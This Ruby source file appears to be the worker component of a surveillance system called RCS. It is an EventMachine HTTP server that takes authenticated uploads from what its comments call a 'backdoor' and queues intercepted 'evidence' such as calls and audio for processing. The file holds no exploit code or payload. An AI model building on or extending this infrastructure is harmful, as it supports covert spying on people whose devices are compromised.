#
# The main file of the worker
#

# relatives
require_relative 'audio_processor'
require_relative 'evidence/call'
require_relative 'parser'

# from RCS::DB
require 'rcs-db/config'

# from RCS::Common
require 'rcs-common/trace'
require 'rcs-common/evidence'
require 'rcs-common/evidence_manager'

# form System
require 'digest/md5'
require 'net/http'
require 'optparse'

require 'eventmachine'
require 'evma_httpserver'

module RCS
module Worker

Thread.abort_on_exception=true

class HTTPHandler < EM::Connection
  include RCS::Tracer
  include EM::HttpServer
  include Parser
  
  def post_init
    # don't forget to call super here !
    super
    
    # to speed-up the processing, we disable the CGI environment variables
    self.no_environment_strings
    
    # set the max content length of the POST
    self.max_content_length = 30 * 1024 * 1024
    
    # get the peer name
    @peer_port, @peer = Socket.unpack_sockaddr_in(get_peername)
    #trace :debug, "Connection from #{@peer}:#{@peer_port}"
  end

  def process_http_request
    # the http request details are available via the following instance variables:
    #   @http_protocol
    #   @http_request_method
    #   @http_cookie
    #   @http_if_none_match
    #   @http_content_type
    #   @http_path_info
    #   @http_request_uri
    #   @http_query_string
    #   @http_post_content
    #   @http_headers

    #trace :debug, "[#{@peer}] Incoming HTTP Connection"
    #trace :debug, "[#{@peer}] Request: [#{@http_request_method}] #{@http_request_uri}"

    resp = EM::DelegatedHttpResponse.new(self)

    # Block which fulfills the request
    operation = proc do

      # do the dirty job :)
      # here we pass the control to the internal parser which will return:
      #   - the content of the reply
      #   - the content_type
      #   - the cookie if the backdoor successfully passed the auth phase
      begin
        status, content, content_type = process_request(@http_headers.split("\x00"), @http_request_method, @http_request_uri, @http_cookie, @http_post_content)
      rescue Exception => e
        trace :error, "ERROR: " + e.message
        trace :fatal, "EXCEPTION: " + e.backtrace.join("\n")
      end
      
      # prepare the HTTP response
      resp.status = status
      # status_string from status code
      resp.status_string = Net::HTTPResponse::CODE_TO_OBJ["#{status}"].name.gsub(/Net::HTTP/, '')
      resp.content = content
      resp.headers['Content-Type'] = content_type
      resp.headers['Connection'] = 'close'
    end
    
    # Callback block to execute once the request is fulfilled
    callback = proc do |res|
    	resp.send_response
    end

    # Let the thread pool handle request
    EM.defer(operation, callback)
  end

end

class Worker
  include Tracer
  
  attr_reader :type, :audio_processor
  
  def resume
    instances = EvidenceManager.instance.instances
    instances.each do |instance|
      trace :info, "Resuming remaining evidences for #{instance}"
      ids = EvidenceManager.instance.evidence_ids instance
      ids.each {|id| QueueManager.instance.queue(instance, id)}
    end
  end
  
  def setup(port = 5150)
    
    # main EventMachine loop
    begin

      resume

      # all the events are handled here
      EM::run do
        # if we have epoll(), prefer it over select()
        EM.epoll
        
        # set the thread pool size
        EM.threadpool_size = 50
        
        EM::start_server("127.0.0.1", port, HTTPHandler)
        trace :info, "Listening on port #{port}..."
        
      end
    rescue Exception => e
      # bind error
      if e.message.eql? 'no acceptor' then
        trace :fatal, "Cannot bind port #{Config.instance.global['LISTENING_PORT']}"
        return 1
      end
      raise
    end
    
  end

end

class Application
  include RCS::Tracer
  
  # To change this template use File | Settings | File Templates.
  def run(options) #, file)
    
    # if we can't find the trace config file, default to the system one
    if File.exist? 'trace.yaml' then
      typ = Dir.pwd
      ty = 'trace.yaml'
    else
      typ = File.dirname(File.dirname(File.dirname(__FILE__)))
      ty = typ + "/config/trace.yaml"
      #puts "Cannot find 'trace.yaml' using the default one (#{ty})"
    end
    
    # ensure the log directory is present
    Dir::mkdir(Dir.pwd + '/log') if not File.directory?(Dir.pwd + '/log')
    
    # initialize the tracing facility
    begin
      trace_init typ, ty
    rescue Exception => e
      puts e
      exit
    end
    
    begin
      version = File.read(Dir.pwd + '/config/version.txt')
      trace :info, "Starting a RCS Worker #{version}..."
      
      # config file parsing
      return 1 unless RCS::DB::Config.instance.load_from_file
      
      Worker.new.setup RCS::DB::Config.instance.global['WORKER_PORT']
    rescue Exception => e
      trace :fatal, "FAILURE: " << e.to_s
      trace :fatal, "EXCEPTION: " + e.backtrace.join("\n")
      return 1
    end
    
    return 0
  end
  
  # we instantiate here an object and run it
  def self.run!(*argv)
    return Application.new.run argv
  end
end

end # Worker::
end # RCS::